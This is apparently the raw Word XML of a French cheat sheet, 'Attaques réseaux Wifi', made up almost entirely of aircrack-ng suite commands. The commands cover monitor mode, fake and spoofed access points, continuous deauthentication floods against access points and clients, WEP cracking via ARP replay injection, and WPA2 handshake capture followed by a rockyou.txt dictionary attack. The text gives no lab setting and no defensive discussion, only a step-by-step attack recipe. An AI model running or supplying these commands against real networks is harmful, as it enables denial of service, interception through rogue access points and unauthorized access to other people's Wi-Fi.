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0C" w:rsidRPr="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00C6380C">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Passage en mode </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>monitor</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> (scan d’activité)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>airmon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> start wlan0</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:tab/>
        <w:t xml:space="preserve"># Activation du mode </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>monitor</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consolelastline"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t># Lancer l’écoute réseau</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:r>
        <w:t>Création d’un faux point d’accès Wifi</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>--- Simple</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3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BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>airbase-ng --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;Network Name&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRPr="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> Usurpation de la configuration d</w:t>
      </w:r>
      <w:r>
        <w:t>’un point d’accès légitime</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consolelastline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">airbase-ng -a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>essid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;Network Name&gt; -c &lt;CHANNEL&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRPr="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:r w:rsidRPr="00BC23C3">
        <w:t>Attaque DDoS de désauthentification</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">--- Désauthentification du point </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>d’accès</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-ng -0 0 -a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r>
        <w:t>--- Désauthentification du client</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consolelastline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">-ng -0 0 -a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>xx:xx:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:r w:rsidRPr="00BC23C3">
        <w:t>Crack de clé WEP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRPr="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>encrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> WEP wlan0mon</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:tab/>
        <w:t># N’affiche</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que les réseaux WEP</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-ng -w &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fichier</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> WEP&gt; --BSSID &lt;MAC&gt; -c &lt;CHANNEL&gt; wlan0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRPr="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>--- Ouvrir une nouvelle fenêtre p</w:t>
      </w:r>
      <w:r>
        <w:t>our générer du trafic (rejeu ARP)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> -3 (injection) -b &lt;BSSID&gt; -h &lt;MAC </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>target</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r>
        <w:t>--- Attendre d’avoir au moins 10000-15000 données reçues</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consolelastline"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>aircrack-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> &lt;fichier WEP&gt;.cap</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:r>
        <w:t>Crack de clé WPA2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00BC23C3" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t>encrypt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> W</w:t>
      </w:r>
      <w:r>
        <w:t>PA2</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:t xml:space="preserve"> wlan0mon</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC23C3">
        <w:tab/>
        <w:t># N’affiche</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que les réseaux W</w:t>
      </w:r>
      <w:r>
        <w:t>PA2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BC23C3" w:rsidRDefault="00357DAA" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r>
        <w:t>--- Ouvrir une nouvelle fenêtre pour générer du trafic (désauthentification)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00357DAA" w:rsidRDefault="00357DAA" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-ng -0 (de-auth) 0 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>nb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/sec) -a &lt;BSSID&gt; -h &lt;MAC target&gt; wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00357DAA" w:rsidRDefault="00357DAA" w:rsidP="00BC23C3">
      <w:pPr>
        <w:pStyle w:val="Consoleinline"/>
      </w:pPr>
      <w:r w:rsidRPr="00357DAA">
        <w:t>--- Attendre de récupérer l’handshake complet,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> puis attaque par dictionnaire</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00357DAA" w:rsidRPr="00357DAA" w:rsidRDefault="00357DAA" w:rsidP="00357DAA">
      <w:pPr>
        <w:pStyle w:val="Consolelastline"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>aircrack</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>-ng &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fichier</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00357DAA">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> WPA2&gt;.cap -w rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00357DAA" w:rsidRPr="00357DAA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315" w:rsidRDefault="00593315" w:rsidP="00C6380C">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00593315" w:rsidRDefault="00593315" w:rsidP="00C6380C"/>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00593315" w:rsidRDefault="00593315" w:rsidP="00C6380C">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00593315" w:rsidRDefault="00593315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:rsidR="00B510FD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315" w:rsidRDefault="00593315" w:rsidP="00C6380C">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00593315" w:rsidRDefault="00593315" w:rsidP="00C6380C"/>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00593315" w:rsidRDefault="00593315" w:rsidP="00C6380C">
      <w:r>
        <w:continuationSeparator/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00593315" w:rsidRDefault="00593315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144" w:rsidRDefault="00D44144" w:rsidP="00C6380C">
    <w:pPr>
      <w:pStyle w:val="En-tte"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55FF4056" wp14:editId="3C5404A6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7E43333C" wp14:editId="73118A51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6380C" w:rsidRPr="00C6380C" w:rsidRDefault="00BC23C3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Attaques réseau</w:t>
        </w:r>
        <w:r w:rsidR="00EF62E7">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>x</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> Wifi</w:t>
        </w:r>
      </w:p>
    </w:sdtContent>
  </w:sdt>
  <w:p w:rsidR="00B510FD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9-07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BC23C3">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
            <w:sz w:val="16"/>
            <w:szCs w:val="16"/>
          </w:rPr>
          <w:t>27/07/2019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C23C3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3"/>
    <w:rsid w:val="00023A77"/>
    <w:rsid w:val="000656CD"/>
    <w:rsid w:val="002B1B07"/>
    <w:rsid w:val="00357DAA"/>
    <w:rsid w:val="004050DA"/>
    <w:rsid w:val="004A58E5"/>
    <w:rsid w:val="00593315"/>
    <w:rsid w:val="007B6C60"/>
    <w:rsid w:val="00982295"/>
    <w:rsid w:val="00B510FD"/>
    <w:rsid w:val="00BC23C3"/>
    <w:rsid w:val="00BC7476"/>
    <w:rsid w:val="00C6377E"/>
    <w:rsid w:val="00C6380C"/>
    <w:rsid w:val="00CC409D"/>
    <w:rsid w:val="00D44144"/>
    <w:rsid w:val="00EF62E7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417ED"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{15E43DFE-82B9-44E6-9788-3F88D95E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%20persos\Documents\Mod&#232;les%20de%20documents\Templates%20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12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Attaques réseaux Wifi</dc:title>
  <dc:subject/>
  <dc:creator>Jimmy Poirier</dc:creator>
  <cp:keywords/>
  <dc:description/>
  <cp:lastModifiedBy>Jimmy</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-07-27T13:11:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2019-07-27T13:23:00Z</dcterms:modified>
</cp:coreProperties>
</file>